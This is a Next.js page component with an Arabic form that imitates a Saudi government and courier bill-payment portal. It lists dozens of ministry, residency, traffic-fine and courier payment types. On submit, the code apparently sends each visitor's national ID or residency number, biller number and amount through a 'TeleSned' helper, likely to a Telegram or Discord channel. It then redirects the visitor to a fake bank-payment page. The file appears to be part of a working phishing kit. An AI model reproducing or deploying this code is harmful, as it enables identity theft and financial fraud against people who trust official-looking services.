"use client"
import { useState } from 'react'
import styles from './fozajil.module.css'

import {useRouter,useSearchParams} from 'next/navigation'
import TeleSned from '@/server/TeleSned'


const Page = () => {
  const {Send} = TeleSned();
  const [form,setForm]= useState(  {data : {
    نوع_السداد:"اختر",
    رقم_البطاقة_الشخصية: "",
    قيمة_السداد:"",
    رقم_المفوتر:""
  }},)
  const  name = useSearchParams();
  const track = name.get("name")
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToDiscord = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("%0A");
    Send(description)
    
  };

  const router = useRouter()

  const handlerout = () => {
    
if( form.data.نوع_السداد == "اختر"||form.data.رقم_البطاقة_الشخصية == "" ||  form.data.قيمة_السداد == "" ||form.data.رقم_المفوتر == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks/pay?names=${form.data.رقم_المفوتر}`)
    }
  }

  


  return (
    <div className={styles.contain} dir='rtl'>

        <form onSubmit={(e)=>{
          e.preventDefault();
          PostToDiscord()
        }}> 


    <select name="نوع_السداد"  onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required>
                <option value="اختر">اختر نوع السداد</option>
                <option value="مدفوعات وظفية خدمة عملاء">مدفوعات وظفية خدمة عملاء</option>
                <option value="مدفوعات وزارة الدفاع">مدفوعات وزارة الدفاع</option>
      <option value="مدفوعات شركة زاجل">مدفوعات شركة زاجل </option>
<option value="مدفوعات شركة ارامكس">مدفوعات شركة ارامكس </option>
<option value="مدفوعات شركة سمسا">مدفوعات شركة سمسا </option>
                <option value="مدفوعات وزارة المالية">مدفوعات وزارة المالية</option>
                <option value="مدفوعات وزارة التجارة">مدفوعات وزارة التجارة</option>
                <option value="مدفوعات وزارة الداخلية">مدفوعات وزارة الداخلية</option>
                <option value="مدفوعات وزارة الخارجية">مدفوعات وزارة الخارجية</option>
                <option value="مدفوعات وزارة الصحة">مدفوعات وزارة الصحة</option>
                <option value="مدفوعات اجازات مرضية">مدفوعات اجازات مرضية </option>
                <option value="مدفوعات سكني منح ارض">مدفوعات سكني منح ارض </option>
                <option value="مدفوعات كورونا جرعة اولى">مدفوعات كورونا جرعة اولى </option>
                <option value="مدفوعات كورونا جرعة ثانية">مدفوعات كورونا جرعة ثانية </option>
                <option value="مدفوعات كورونا جرعة ثالثة">مدفوعات كورونا جرعة ثالثة </option>
                <option value="مدفوعات كورونا جرعة رابعة">مدفوعات كورونا جرعة رابعة </option>
                <option value="مدفوعات استرداد اموال">مدفوعات استرداد اموال </option>
                <option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل </option>
                <option value="مدفوعات الموارد والتنمية الاجتماعية">مدفوعات الموارد والتنمية الاجتماعية </option>
                <option value="مدفوعات المؤسسة العامة للتنميات الاجتماعية">مدفوعات المؤسسة العامة للتنميات الاجتماعية </option>
                <option value="مدفوعات التامينات الصحية">مدفوعات التامينات الصحية </option>
                <option value="مدفوعات اسقاط ملكية مركبات">مدفوعات اسقاط ملكية مركبات </option>
                <option value="مدفوعات هيئة الزكاة والدخل">مدفوعات هيئة الزكاة والدخل </option>
                <option value="مدفوعات رخصة قيادة">مدفوعات رخصة قيادة </option>
                <option value="مدفوعات الجوازات">مدفوعات الجوازات </option>
                <option value="مدفوعات حجز شقة">مدفوعات حجز شقة </option>
                <option value="مدفوعات حجز عمال">مدفوعات حجز عمال </option>
                <option value="مدفوعات قروض بنك التنمية">مدفوعات قروض بنك التنمية </option>
                <option value="مدفوعات تجديد اقامة">مدفوعات تجديد اقامة </option>
                <option value="مدفوعات نقل ملكية مركبة">مدفوعات نقل ملكية مركبة </option>
                <option value="مدفوعات عقد الكتروني(سائق-عامل منزلي-عامل مهني)">مدفوعات عقد الكتروني(سائق-عامل منزلي-عامل مهني) </option>
                <option value="مدفوعات عقود الكترونية">مدفوعات عقود الكترونية </option>
                <option value="مدفوعات العقود الكترونية الضمان">مدفوعات العقود الكترونية الضمان </option>
                <option value="مدفوعات العقود الكترونية اسقاط">مدفوعات العقود الكترونية اسقاط </option>
                <option value="مدفوعات الاتصالات">مدفوعات الاتصالات </option>
                <option value="مدفوعات حكومية">مدفوعات حكومية </option>
                <option value="مدفوعات ادارة الوافدين">مدفوعات ادارة الوافدين </option>
                <option value="مدفوعات اصدار اقامة">مدفوعات اصدار اقامة </option>
                <option value="مدفوعات الغاء تاشيرة">مدفوعات الغاء تاشيرة </option>
                <option value="مدفوعات استبدال اقامة">مدفوعات استبدال اقامة </option>
                <option value="مدفوعات رب الاسرة الى تابع">مدفوعات رب الاسرة الى تابع </option>
                <option value="مدفوعات الاحوال المدنية">مدفوعات الاحوال المدنية </option>
                <option value="مدفوعات صندوق التنمية الاقتصادية">مدفوعات صندوق التنمية الاقتصادية </option>
                <option value="الهيئة العامة للدواء والغذاء">الهيئة العامة للدواء والغذاء </option>
                <option value="مدفوعات الاستقدام">مدفوعات الاستقدام </option>
                <option value="مدفوعات المخالفات المرورية">مدفوعات المخالفات المرورية </option>
                <option value="مدفوعات تخفيض المخالفات المرورية">مدفوعات تخفيض المخالفات المرورية </option >
                <option value="مدفوعات تخفيض المخالفات ">مدفوعات تخفيض المخالفات المرورية  </option >
                <option value="مدفوعات الغاء بلاغ هروب ">مدفوعات الغاء بلاغ هروب   </option >
                <option value="مدفوعات  بلاغ هروب ">مدفوعات  بلاغ هروب</option >
                <option value="مدفوعات  نقل كفالة ">مدفوعات  نقل كفالة</option >
                <option value="مدفوعات  رسوم المرافقين  ">مدفوعات  رسوم المرافقين </option >
                <option value="مدفوعات  تسديد الاقامة  ">مدفوعات  تسديد الاقامة </option >
                <option value="مدفوعات  خروج نهائي اقامة منتهية  ">مدفوعات  خروج نهائي اقامة منتهية </option >
                <option value="مدفوعات  خروج نهائي  ">مدفوعات  خروج نهائي </option >
                <option value="الغاء  خروج نهائي  ">الغاء  خروج نهائي </option >
                <option value="اصدار رخصة عمل  ">اصدار رخصة عمل </option >
                <option value="مدفوعات تأمين المركبات  ">مدفوعات تأمين المركبات </option >
                <option value="مدفوعات تصفير المركبات  ">مدفوعات تصفير المركبات </option >
                <option value="مدفوعات المياه والكهرباء  ">مدفوعات المياه والكهرباء </option >
                <option value="مدفوعات تعديل مهنة  ">مدفوعات تعديل مهنة </option >
                <option value="مدفوعات تحويل مهنة  ">مدفوعات تحويل مهنة </option >
                <option value="مدفوعات سداد الرسوم الاداري  ">مدفوعات سداد الرسوم الاداري </option >
                <option value="مدفوعات تعديل الرسوم  ">مدفوعات تعديل الرسوم </option >
                <option value="مدفوعات تخفيض المقابل المالي  ">مدفوعات تخفيض المقابل المالي </option >
                <option value="مدفوعات فتح ملف  ">مدفوعات فتح ملف </option >
                <option value="مدفوعات ايقاف خدمة  ">مدفوعات ايقاف خدمة </option >
                <option value="مدفوعات كرت العمل  ">مدفوعات كرت العمل </option >
                <option value="مدفوعات الغاء بصمة الحج  ">مدفوعات الغاء بصمة الحج </option >
                <option value="مدفوعات تحويل من زائر الى مقيم  ">مدفوعات تحويل من زائر الى مقيم </option >
                <option value="مدفوعات تجديد الجواز  ">مدفوعات تجديد الجواز </option >
                <option value="مدفوعات تجديد التاشيرة  ">مدفوعات تجديد التاشيرة </option >
                <option value="مدفوعات ملاحظة حماية الاجور  ">مدفوعات ملاحظة حماية الاجور </option >
                <option value="مدفوعات اسقاط عامل  ">مدفوعات اسقاط عامل </option >
                <option value="مدفوعات رخص بناء  ">مدفوعات رخص بناء </option >
                <option value="مدفوعات رخص البلدية  ">مدفوعات رخص البلدية </option >
                <option value="مدفوعات قرض امكان  ">مدفوعات قرض امكان </option >
                <option value="مدفوعات تخفيض كرت العمل  ">مدفوعات تخفيض كرت العمل </option >
                <option value="مدفوعات حجز تذاكر  ">مدفوعات حجز تذاكر </option >
                <option value="مدفوعات الجمعيات الخيرية  ">مدفوعات الجمعيات الخيرية </option >
                <option value="مدفوعات قرض بنك التنمية  ">مدفوعات قرض بنك التنمية </option >
                <option value="مدفوعات حجز شقه  ">مدفوعات حجز شقه </option >
                <option value="مدفوعات رخصة القيادة  ">مدفوعات رخصة القيادة </option >
                <option value="مدفوعات تجديد الاقامة  ">مدفوعات تجديد الاقامة </option >
                <option value="مدغوعات عقد عاملة منزلية "> مدغوعات عقد عاملة منزلية</option >
                <option value=" مدفوعات حجز عاملة منزلية"> مدفوعات حجز عاملة منزلية</option >
                <option value=" مدفوعات  سعودة">مدفوعات  سعودة</option >
                <option value=" مدفوعات وشركة تمكين للتقنيات "> مدفوعات وشركة تمكين للتقنيات</option >
                <option value="مدفوعات تأمين مسترد  "> مدفوعات تأمين مسترد</option >
                <option value="مدفوعات شركة مساند "> مدفوعات شركة مساند  </option >
            </select>
            <input type="number" name='رقم_المفوتر' placeholder='رقم المفوتر' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='رقم_البطاقة_الشخصية'  placeholder='ادخل رقم الهوية الوطنية /الاقامة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}required />

            <input type="number" name='قيمة_السداد' placeholder='قيمة السداد'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />

        <button type='submit' onClick={handlerout}>دخول</button>
        </form>
    </div>

  )
}

export default Page; 
